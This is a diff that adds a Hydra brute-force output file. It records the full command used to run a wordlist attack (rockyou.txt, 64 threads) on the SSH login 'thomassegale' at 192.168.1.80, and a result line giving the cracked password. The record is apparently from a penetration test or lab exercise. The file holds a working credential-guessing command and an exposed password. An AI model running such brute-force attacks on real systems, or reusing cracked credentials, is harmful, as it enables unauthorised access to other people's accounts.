@@ -1,0 +1,2 @@
+# Hydra v9.3 run at 2022-05-21 08:41:12 on 192.168.1.80 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.80)
+[22][ssh] host: 192.168.1.80   login: thomassegale   password: Mm2021M1
